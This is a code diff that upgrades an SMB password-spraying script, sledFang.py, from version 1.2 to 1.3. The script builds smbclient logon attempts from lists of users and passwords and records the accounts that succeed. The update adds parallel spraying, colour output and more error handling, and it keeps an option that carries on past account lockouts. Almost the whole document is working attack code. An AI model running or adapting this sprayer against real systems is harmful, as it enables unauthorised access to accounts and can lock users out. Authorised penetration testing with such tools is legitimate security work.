@@ -1,5 +1,5 @@
 #! python3
-# sledFang.py -v 1.2
+# sledFang.py -v 1.3
 # Author- David Sullivan
 #
 # Use smbclient to password spray against a device
@@ -9,12 +9,13 @@
 #                                   added verbosity as well.
 # Revision  1.2     -   06/03/2019- Added new false positive, updated output to not write duplicates, added logic to
 #                                   not continue spraying against locked out account when the bypass option is used.
+# Revision  1.3     -   07/19/2019- Added colorized output, better error handling, multiprocessing
 #
 # Example Usage:
 # python3 sledFang.py -d domain -u user -p password -t 127.0.0.1 -o output.txt
 # python3 sledFang.py -d domain -U userlist.txt -P passwordlist.txt -t 127.0.0.1 -o output.txt
 
-import subprocess, argparse, time
+import subprocess, argparse, time, multiprocessing
 
 
 def write_output(user, password, output):
@@ -39,7 +40,93 @@ def write_output(user, password, output):
         file.close()
 
 
-def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_limit, delay, verbose, very_verbose):
+# new print statement for being able to print in varying colors
+def printColor(color_input, color):
+    if color == 'red':
+        print("\033[91m {}\033[00m" .format(color_input))
+    elif color == 'green':
+        print("\033[92m {}\033[00m".format(color_input))
+    elif color == 'yellow':
+        print("\033[93m {}\033[00m".format(color_input))
+    else:
+        print(color_input)
+
+
+def attack(domain, target_ip, output, bypass, verbose, very_verbose, user, password, user_list_clean, temp_users):
+    # build the command line argument for smbclient
+    arguments = 'smbclient -U "%s\%s%%%s" -L %s' % (domain, user, password, target_ip)
+    # print command if verbosity is turned on
+    if very_verbose:
+        print(arguments)
+    # send the command line query and pipe the response to standard out
+    response = subprocess.Popen(arguments, shell=True, stdout=subprocess.PIPE).stdout
+    # decode the response as a string
+    answer = (response.read()).decode()
+    # print response if verbosity is turned on
+    if verbose or very_verbose:
+        print(answer)
+    # check to see if the server can be connected to, if not, stop the script
+    if answer == "Connection to %s failed (Error was NT_STATUS_CONNECTION_REFUSED)\n" % target_ip:
+        printColor("[-] Unable to connect to server", "red")
+        quit()
+    elif answer == "Connection to %s failed (Error was NT_STATUS_IO_TIMEOUT)\n" % target_ip:
+        printColor("[-] Unable to connect to server", "red")
+        quit()
+    elif answer == "Connection to %s failed (Error NT_STATUS_IO_TIMEOUT)\n" % target_ip:
+        printColor("[-] Unable to connect to server", "red")
+        quit()
+    elif answer == "Connection to %s failed (Error NT_STATUS_UNSUCCESSFUL)\n" % target_ip:
+        printColor("[-] Unable to connect to server", "red")
+        quit()
+    elif answer == "":
+        printColor("[-] Unable to connect to server", "red")
+        quit()
+    # check to see if logon attempts are being throttled, if so stop the sprayer
+    elif answer == "session setup failed: NT_STATUS_CONNECTION_RESET\n":
+        printColor("[-] Connection reset, too many connections attempt, please increase rate limit", "red")
+        printColor(("[*] Stopped at user %s" % user), "yellow")
+        quit()
+    # check to see if the account is expired, if so, print out the account and remove from spraying list
+    elif answer == "session setup failed: NT_STATUS_PASSWORD_EXPIRED\n":
+        printColor(("[-] " + answer.replace("\n", "") + " using the account " + user + " and the password " + password),
+                   "red")
+        temp_users.remove(user)
+    # check to see if the account is disabled if so, print out the account and remove from spraying list
+    elif answer == "session setup failed: NT_STATUS_ACCOUNT_DISABLED\n":
+        printColor(("[-] " + answer.replace("\n", "") + " using the account " + user + " and the password " + password),
+                   "red")
+        temp_users.remove(user)
+    # check to see if the account is restricted if so, print out the account and remove from spraying list
+    elif answer == "session setup failed: NT_STATUS_ACCOUNT_RESTRICTION\n":
+        printColor(("[-] " + answer.replace("\n", "") + " using the account " + user + " and the password " + password),
+                   "red")
+        temp_users.remove(user)
+    # check to see if the account has been locked out, if so
+    elif answer == "session setup failed: NT_STATUS_ACCOUNT_LOCKED_OUT\n":
+        printColor(("[-] " + answer.replace("\n", "") + " using the account " + user + " and the password " + password),
+                   "red")
+        user_diff = set(user_list_clean) - set(temp_users)
+        # check to see if the bypass flag is set, if not, stop spraying
+        if bypass is not True:
+            printColor("[*] Stopping script due to account lockout", "yellow")
+            printColor("[*] The following accounts are expired, disabled or cracked:", "yellow")
+            print(user_diff)
+            quit()
+        # if the bypass flag is set, remove the locked out account from the spraying queue
+        else:
+            temp_users.remove(user)
+    # if logon fails, drop the response, any other response, print to screen and remove account from spraying
+    elif answer != "session setup failed: NT_STATUS_LOGON_FAILURE\n":
+        if answer != "session setup failed: NT_STATUS_ACCESS_DENIED\n":
+            printColor(("[+] The account %s was successfully logged into using the password %s" % (user, password)),
+                       "green")
+            temp_users.remove(user)
+            # write password to file
+            if output is not None:
+                write_output(user, password, output)
+
+
+def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_limit, delay, verbose, very_verbose, threading):
     # loop through each set of passwords, spraying each user
     print("Running")
     # remove the new line character from the users
@@ -53,80 +140,33 @@ def sprayer(domain, user_list, password_list, target_ip, output, bypass, rate_li
         password = password.replace("\n", "")
         password_list_clean.append(password)
 
+    # create a pool and limit processes
+    pool = multiprocessing.Pool(processes=threading)
+
     # create a copy of the user list to remove users if the correct password is found, or the account gets locked
     temp_users = user_list_clean[:]
     for password in password_list_clean:
         time.sleep(delay)
-        print("Spraying using %s" % password)
+        printColor(("Spraying using %s" % password), "yellow")
         # update the user_list based on found passwords or locked accounts
         user_list = temp_users[:]
         for user in user_list:
-            # use the rate limiter between accounts attacked
-            time.sleep(rate_limit)
-            # build the command line argument for smbclient
-            arguments = 'smbclient -U "%s\%s%%%s" -L %s' % (domain, user, password, target_ip)
-            # print command if verbosity is turned on
-            if very_verbose:
-                print(arguments)
-            # send the command line query and pipe the response to standard out
-            response = subprocess.Popen(arguments, shell=True, stdout=subprocess.PIPE).stdout
-            # decode the response as a string
-            answer = (response.read()).decode()
-            # print response if verbosity is turned on
-            if verbose or very_verbose:
-                print(answer)
-            # check to see if the server can be connected to, if not, stop the script
-            if answer == "Connection to %s failed (Error was NT_STATUS_CONNECTION_REFUSED)\n" % target_ip:
-                print("Unable to connect to server")
-                quit()
-            elif answer == "Connection to %s failed (Error was NT_STATUS_IO_TIMEOUT)\n" % target_ip:
-                print("Unable to connect to server")
-                quit()
-            # check to see if logon attempts are being throttled, if so stop the sprayer
-            elif answer == "session setup failed: NT_STATUS_CONNECTION_RESET\n":
-                print("Connection reset, too many connections attempt, please increase rate limit")
-                print("Stopped at user %s" % user)
-                quit()
-            # check to see if the account is expired, if so, print out the account and remove from spraying list
-            elif answer == "session setup failed: NT_STATUS_PASSWORD_EXPIRED\n":
-                print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
-                temp_users.remove(user)
-            # check to see if the account is disabled if so, print out the account and remove from spraying list
-            elif answer == "session setup failed: NT_STATUS_ACCOUNT_DISABLED\n":
-                print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
-                temp_users.remove(user)
-            # check to see if the account is restricted if so, print out the account and remove from spraying list
-            elif answer == "session setup failed: NT_STATUS_ACCOUNT_RESTRICTION\n":
-                print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
-                temp_users.remove(user)
-            # check to see if the account has been locked out, if so
-            elif answer == "session setup failed: NT_STATUS_ACCOUNT_LOCKED_OUT\n":
-                print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
-                user_diff = set(user_list_clean) - set(temp_users)
-                # check to see if the bypass flag is set, if not, stop spraying
-                if bypass is not True:
-                    print('Stopping script due to account lockout')
-                    print('The following accounts are expired, disabled or cracked:')
-                    print(user_diff)
-                    quit()
-                # if the bypass flag is set, remove the locked out account from the spraying queue
-                else:
-                    temp_users.remove(user)
-            # if logon fails, drop the response, any other response, print to screen and remove account from spraying
-            elif answer != "session setup failed: NT_STATUS_LOGON_FAILURE\n":
-                if answer != "session setup failed: NT_STATUS_ACCESS_DENIED\n":
-                    print("The account %s was successfully logged into using the password %s" % (user, password))
-                    temp_users.remove(user)
-                    # write password to file
-                    if output is not None:
-                        write_output(user, password, output)
+            # use the rate limiter between accounts attacked if set
+            if rate_limit > 0:
+                time.sleep(rate_limit)
+                pool = multiprocessing.Pool(processes=1)
+                pool.apply_async(attack, args=(domain, target_ip, output, bypass, verbose, very_verbose, user, password, user_list_clean, temp_users, ))
+            else:
+                pool.apply_async(attack, args=(domain, target_ip, output, bypass, verbose, very_verbose, user, password, user_list_clean, temp_users, ))
+        pool.close()
+        pool.join()
     print("Complete")
 
 
 def main():
     # parse input for variables
     parser = argparse.ArgumentParser(description='SMB Password Sprayer')
-    parser.add_argument('-d', '--domain', help="Domain name")
+    parser.add_argument('-d', '--domain', help='Domain name')
     parser.add_argument('-U', '--userlist', help='Location of users list')
     parser.add_argument('-u', '--user', help='Use a single user name')
     parser.add_argument('-P', '--passwordlist', help='Location of passwords list')
@@ -138,6 +178,7 @@ def main():
     parser.add_argument('-b', '--bypass', action='store_true', help='Bypass locked accounts')
     parser.add_argument('-v', '--verbose', action='store_true', help='Show Responses')
     parser.add_argument('-V', '--very_verbose', action='store_true', help='Show Requests and Responses')
+    parser.add_argument('-T', '--threading', help='Set number of parallel threads to spray')
     args = parser.parse_args()
 
     # set list of users
@@ -184,6 +225,12 @@ def main():
     else:
         output = None
 
+    # set threading limit
+    if args.threading is not None:
+        threading = int(args.threading)
+    else:
+        threading = 4
+
     # bypass boolean
     bypass = args.bypass
 
@@ -192,7 +239,7 @@ def main():
     very_verbose = args.very_verbose
 
     # run the program
-    sprayer(domain, users, passwords, target, output, bypass, rate_limit, delay, verbose, very_verbose)
+    sprayer(domain, users, passwords, target, output, bypass, rate_limit, delay, verbose, very_verbose, threading)
 
 
 main()
